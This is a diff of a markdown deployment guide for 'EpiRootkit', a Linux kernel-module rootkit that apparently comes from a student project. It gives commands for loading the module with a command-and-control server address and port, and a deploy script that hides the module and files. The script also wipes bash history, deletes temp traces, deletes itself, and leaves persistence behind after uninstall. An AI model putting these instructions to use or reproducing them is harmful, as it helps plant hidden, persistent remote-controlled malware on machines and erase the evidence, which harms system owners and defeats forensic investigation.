@@ -18,7 +18,6 @@ How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.
 ### System
 - **OS**: Ubuntu 20.04 LTS
 - **Kernel**: 5.4.0-* (check with `uname -r`)
-- **Architecture**: x86_64
 
 ### Dependencies
 ```bash
@@ -26,25 +25,6 @@ sudo apt update
 sudo apt install -y build-essential linux-headers-$(uname -r)
 ```
 
-## Configuration
-
-Edit `rootkit/core/config.h` before building:
-
-```c
-// Option 1: Domain name (recommended)
-#define C2_SERVER_ADDRESS "jules-c2.example.com"
-#define C2_SERVER_PORT 4444
-
-// Option 2: IP address (traditional)
-#define C2_SERVER_ADDRESS "192.168.64.1"
-#define C2_SERVER_PORT 4444
-
-// Feature settings
-#define ENABLE_ENCRYPTION 1      // XOR encryption enabled
-#define ENABLE_PERSISTENCE 1     // Auto-install persistence
-#define ENABLE_MODULE_HIDING 1   // Hide module by default
-#define ENABLE_FILE_HIDING 1     // Hide files with prefixes
-```
 
 ## Build
 
@@ -56,28 +36,79 @@ make clean && make
 
 ## Deployment
 
-### Quick Deploy (Recommended)
+### Deployment Script
+
 ```bash
-# Deploy with domain name
+# Default usage (uses ./epirootkit.ko automatically)
+sudo ./deploy_rootkit.sh
+
+# Custom C2 server
+sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444
+
+# Domain-based deployment
 sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
 
-# Deploy with IP address
-sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
+# Stealth deployment with self-cleanup
+sudo ./deploy_rootkit.sh --self-delete
 
-# Deploy with defaults from config.h
-sudo ./deploy_rootkit.sh
+# Verbose deployment (show output)
+sudo ./deploy_rootkit.sh --verbose
 ```
 
-### Manual Loading
+### Deployment Options
+| Option | Description |
+|--------|-------------|
+| `--verbose` | Show detailed output during deployment |
+| `--self-delete` | Remove script after successful deployment |
+| `status` | Check current deployment status |
+| `uninstall` | Remove module and cleanup |
+
+### Advanced Usage
+```bash
+# Ultimate stealth deployment
+sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
+
+# Deploy with verbose output then self-destruct
+sudo ./deploy_rootkit.sh --verbose --self-delete
+
+# Check deployment status
+sudo ./deploy_rootkit.sh status
+# Status: Active (hidden)
+# Note: Persistence is managed internally by the rootkit
+
+# Remove deployment
+sudo ./deploy_rootkit.sh uninstall
+# Module uninstalled
+```
+
+### Manual Loading (Alternative)
 ```bash
 # Load with domain
-sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
+sudo insmod epirootkit.ko address=jules-c2.example.com
 
 # Load with IP
-sudo insmod epirootkit.ko address=192.168.1.100 port=4444
+sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 
-# Load with defaults
+# Load with defaults from config.h
 sudo insmod epirootkit.ko
+```
+
+## Self-Cleanup Features
+
+The deployment script includes advanced stealth capabilities:
+
+### Trace Cleanup
+- **Temp files**: Removes all `/tmp/jules_est_bo_*` files
+- **History cleanup**: Removes deployment commands from bash history
+- **Stealth backup**: Creates and removes backup module files
+
+### Self-Destruction
+```bash
+# Deploy and vanish completely
+sudo ./deploy_rootkit.sh --self-delete
+# Deployment successful
+# Self-deleting deployment script...
+# (script file removed automatically)
 ```
 
 ## Management
@@ -85,19 +116,21 @@ sudo insmod epirootkit.ko
 ### Check Status
 ```bash
 sudo ./deploy_rootkit.sh status
-# Module Status: LOADED
-# Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko
-# Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf)
-# Connection: CONNECTED (c2.example.com:443)
+# Status: Active (hidden)
+# Note: Persistence is managed internally by the rootkit
 ```
+
+### Default Behavior
+- **Module file**: Uses `./epirootkit.ko` by default if no file specified
+- **C2 address**: Uses `192.168.200.11:4444` by default
+- **Stealth mode**: Silent operation by default (use `--verbose` for output)
+- **Persistence**: Automatically handled by rootkit internal mechanisms
 
 ### Complete Removal
 ```bash
 sudo ./deploy_rootkit.sh uninstall
-# ✓ Module unloaded
-# ✓ Autoload disabled
-# ✓ Module file removed
-# ✓ Dependencies updated
+# Module uninstalled
+# Note: Rootkit persistence may remain - use rootkit's own removal commands
 ```
 
 **Domain Support**: The rootkit supports both domain names and IP addresses. For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
